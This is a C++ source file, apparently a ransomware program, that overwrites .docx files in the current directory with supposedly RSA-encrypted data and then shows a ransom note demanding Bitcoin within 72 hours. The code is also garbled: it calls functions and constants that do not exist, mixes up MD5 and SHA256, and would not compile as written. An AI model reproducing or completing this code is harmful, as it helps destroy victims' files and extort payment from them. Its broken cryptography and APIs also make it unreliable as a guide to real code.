#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <algorithm>
#include <ctime>
#include <filesystem> // Requires C++17 or later
#include <Windows.h>

using namespace std;

// Function to calculate the file hash (SHA256)
string getFileHash(const char* filename, vector<char>& buffer) {
  FILE *file = fopen(filename, "rb");
  if (!file) {
    return ""; // Or throw an exception if desired
  }

  fseek(file, 0, SEEK_END);
  long size = ftell(file);
  fseek(file, 0, SEEK_BEGIN);

  buffer.resize(size);
  if (fread(&buffer[0], 1, size, file) != size) {
    return "";
  }

  MD5Context md5;
  MD5Init(&md5);
  MD5Update(&md5, buffer, size);
  MD5Final(buffer);

  char result[33]; // SHA256 checksum is 32 characters + null terminator
  if (MD5CalcSHA256((unsigned char*)result, sizeof(result), &md5)) {
    return string(result);
  }

  return "";
}


// Function to encrypt a single file
bool encryptFile(const char* filename, vector<char>& buffer) {
  if (filename == nullptr || buffer.empty()) return false;

  string hash = getFileHash(filename, buffer);
  if (hash.empty()) return false;

  // Encryption logic (RSA-4096 example)
  const char* key = "YOUR_RSA_KEY"; // Replace with your RSA public key
  const char* message = "YOUR_ENCRYPTED_DATA";
  int filesize = 1024; // Change this based on the file size

  // Allocate space for the encrypted file, including padding and headers
  vector<char> encryptedData(filesize + 20);

  // Copy the original data into the buffer
  memcpy(encryptedData.data(), buffer.data(), filesize);

  // Add the RSA hash to the beginning of the message
  std::string hash_str = hash;
  int keyLength = strlen(key);
  char* keyBytes = (char*)key;
  encryptFileRSA(hash_str.c_str(), sizeof(hash_str), keyBytes, keyLength, encryptedData.data());

  // Write the encrypted data to a new file or replace it
  const char* outputFilename = filename;
  FILE *fileOut = fopen(outputFilename, "wb");
  if (fileOut) {
    fwrite(encryptedData.data(), 1, filesize + 20, fileOut);
    fclose(fileOut);
    return true;
  } else {
    cout << "Error opening file for writing: " << filename << endl;
    return false;
  }

}

// Function to encrypt all files with a .docx extension
void encryptAllDocxFiles() {
  std::vector<std::string> docxFiles;
  for (auto& entry : std::filesystem::directory_entries("./", "*.docx")) {
    docxFiles.push_back(entry);
  }

  if (docxFiles.empty()) {
    cout << "No .docx files found." << endl;
    return;
  }

  for (int i = 0; i < docxFiles.size(); ++i) {
    const char* filename = docxFiles[i].c_str();
    vector<char> buffer(1024); // Adjust based on file size
    if (encryptFile(filename, buffer)) {
      cout << "Encrypted: " << filename << endl;
    } else {
      cout << "Error encrypting: " << filename << ". Check the logs." << endl;
    }
  }
}

// Function to display the ransom note
void showRansomNote() {
    cout << "\n--- Ransom Note ---" << endl;
    cout << "Your files have been encrypted!" << endl;
    cout << "To decrypt them, you must pay the following amount in Bitcoin:" << endl;
    cout << "0.001 BTC (Approximately 50 USD)" << endl;
  
    cout << "\nYou can send payment to this address: " << "YOUR_BITCOIN_ADDRESS" << endl; // Change to your Bitcoin Address
  
    cout << "If you do not pay within 72 hours, the files will be permanently lost!" << endl;
    cout << "\n--- End of Note ---" << endl;
}


// Function to implement RSA encryption
void encryptFileRSA(const char* filename, int filesize, const char* key, int keyLength, char* encryptedData) {
    int i = 0;
    while (i < filesize) {
        if (i + keyLength >= filesize) {
            // Handle the last fragment of the file
            encryptedData[i] = key[0]; // Pad with a single bit if necessary
            break;
        }

        // Encrypt one byte using RSA
        if (RSA_Encrypt(encryptedData + i, 1, key) != 0){
           cout << "Encryption Failed!" << endl;
           return;
        }
        i += keyLength;
    }
}


int main() {

  // Make sure C++17 or later is enabled (required for filesystem)
  if (!std::filesystem::directory_exists("./")) {
    cout << "Directory does not exist." << endl;
    return 1;
  }

  srand(time(nullptr)); // Seed the random number generator

  // Example Usage: Encrypt a single .docx file or all files with ".docx" extension.
  // You can call encryptFile() to encrypt one specific file, or encryptAllDocxFiles() for multiple files.

  cout << "Starting encryption process..." << endl;
  std::cout << "Enter the filename you want to encrypt: ";
  string inputFilename;
  getline(std::cin, inputFilename);
  vector<char> buffer(1024);
  if (encryptFile(inputFilename.c_str(), buffer)) {
      cout << "Encryption successful!" << endl;
  } else {
      cout << "Encryption failed." << endl;
  }


  // You can also encrypt all .docx files in the current directory:
  // encryptAllDocxFiles();

  cout << "\n--- Ransomware ---" << endl;
  showRansomNote();
  system("pause");
  return 0;
}
